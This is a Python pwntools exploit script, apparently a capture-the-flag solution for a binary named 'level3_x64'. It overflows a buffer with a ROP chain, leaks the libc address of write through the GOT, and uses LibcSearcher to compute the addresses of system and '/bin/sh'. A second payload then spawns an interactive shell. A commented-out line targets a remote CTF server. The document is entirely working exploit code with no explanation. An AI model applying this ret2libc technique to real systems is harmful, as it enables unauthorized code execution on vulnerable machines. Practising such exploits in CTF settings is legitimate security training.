from pwn import *
from LibcSearcher import *
context.log_level = "debug"
#context.arch = 'amd64'
elf=ELF('./level3_x64')
io=process('./level3_x64')
#p=remote('redirect.do-not-trust.hacking.run',10048)
elf_got=elf.got["write"]
elf_plt=elf.plt["write"]
ret=0x400499
pop_rdi=0x4006b3
pop_rsi_r15_ret=0x4006b1
vul=0x4005E6
payload=b"a"*(0x80)+b'b'*8+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15_ret)+p64(elf_got)+p64(0)+p64(elf_plt)+p64(vul)
io.recvuntil("Input:\n")
io.sendline(payload)
elf_addr=u64(io.recv(6).ljust(8,b'\x00'))
print(hex(elf_addr))
libc=LibcSearcher('write',elf_addr)
libcbase=elf_addr-libc.dump('write')
system_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')
payload=(b'a'*0x80)+(b'b'*8)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)
io.recvuntil("now,Try Pwn Me?\n")
io.sendline(payload)
io.interactive()